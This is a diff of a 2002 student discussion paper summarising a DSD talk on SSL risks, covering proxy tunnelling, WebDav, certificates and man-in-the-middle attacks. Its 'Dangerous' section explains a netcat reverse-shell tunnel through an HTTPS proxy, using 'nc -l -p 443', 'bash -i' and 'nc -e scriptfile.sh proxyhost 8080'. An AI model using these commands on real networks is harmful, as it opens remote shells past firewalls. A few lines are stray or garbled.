@@ -1,13 +1,13 @@
 <!DOCTYPE article PUBLIC "-//OASIS//DTD DocBook V4.1//EN">
 <article>
-<title>Grid computing and the open grid services architecture</title>
-   <subtitle>A final year project discussion paper (number two)</subtitle>
+<title>Secure Sockets Layer: Pitfalls and Risks</title>
+   <subtitle>A final year project discussion paper (number three)</subtitle>
 
 <sect1>
 <title>About the author</title>
 <para>
 Michael's student number is 964076. He can be contacted at mikal@stillhq.com. Copyright (c) Michael Still 2002. This submission is
-    310
+    390
 words, not including the code snippets.
 </para>
 </sect1>
@@ -15,40 +15,47 @@ words, not including the code snippets.
 <sect1>
 <title>Abstract</title>
 <para>
-
+This talk discussed some of Defense Signals Directorate's (DSD) concerns regarding the security of the Secure Sockets Layer (SSL) infrastructure deployed by almost all Internet users. It discussed the theory of proxying SSL, and the insecurities this causes. It then demonstrated a variety of symantec attacks against SSL users based on the injection of deceptive certificates into the Operating System certificate store.
 </para>
 </sect1>
 
 <sect1><title>The meeting</title>
 <para>
-Held at the AFP place
-16 July 2002, 2pm to 3pm
+This meeting was held at the Australian Federal Police College, in Barton, ACT on 16 July 2002, between 5:30pm and 7:30pm. The speakers were Steven McLeod and Dr Michael Cohen from DSD.
 </para>
 </sect1>
 
-Secure Sockets Layer: Pitfalls and Risks
-
-Steven McLeod
-Dr Michael Cohen
-
-Main issue is the trust mechanism
+<sect1><title>Main issue is the trust mechanism</title>
+<para>
  - Normal port is 443
+</para>
+</sect1>
 
-SSL was designed to solve two problems
+<sect1><title>SSL was designed to solve two problems</title>
+<para>
  - intercept of data
  - proof of identity of the communicating parties
+</para>
+</sect1> 
 
-Threats
+<sect1><title>Threats</title>
+<para>
  - SSL is encrypted
  - Man in the middle should not be able to view traffic
   - Therefore no: firewalling, ids, virus scan, auditing
+</para>
+</sect1>
 
-Normally
+<sect1><title>Normally</title>
+<para>
  - Client requests connect to server (CONNECT ... HTTP/1.1)
  - Firewall builds a tunnel
  - Client and server talk 
+</para>
+</sect1>
 
-Dangerous
+<sect1><title>Dangerous</title>
+<para>
  - Run on outside machine: nc -l -p 443
 
 #!/bin/bash
@@ -58,8 +65,11 @@ bash -i 2> /dev/null
  - On inside machine: nc -e scriptfile.sh proxyhost 8080
 
  - There are windows apps to do this too (HTTPort)
+</para>
+</sect1>
 
-WebDav
+<sect1><title>WebDav</title>
+<para>
  - Web Distributed Authoring and Versioning
  - File management over HTTP
  - Upload arbitary files
@@ -67,27 +77,46 @@ WebDav
 
  - Well supported on Windows especially
  - Most good web servers support it
+</para>
+</sect1>
 
-Certificates
+<sect1><title>Certificates</title>
+<para>
  - A digital statement collating a number of fields
  - Company name, server name, email address, public key
  - Signed by the certifying authority
+</para>
+</sect1>
 
-Therefore
+<sect1><title>Therefore</title>
+<para>
  - CA needs to perform identity checks
  - Cert can't be changed
  - Anyone can verify certificate
  - The decision of trust in a browser is made about whether the browser trusts the CA
+</para>
+</sect1>
 
-Securing the server's private key
+<sect1><title>Securing the server's private key</title>
+<para>
  - Apache uses a pass phrase to encrypt the private key
  - IIS doesn't bother!
+</para>
+</sect1>
 
-Attacks
- - Man in the middle -- certificate stops this
+<sect1><title>Attacks</title>
+<para>
+ - Man in the middle -- certificate stops this (or does it)
+</para>
+</sect1>
 
+<sect1><title>APPLET vulnerability in MSIE</title>
+<para>
 
-
+http://www.dsd.gov.au/papers/AusCert2002.pdf
+                      talks     c
+</para>
+</sect1>
 
 <sect1><title>Response to the talk</title>
 <para>
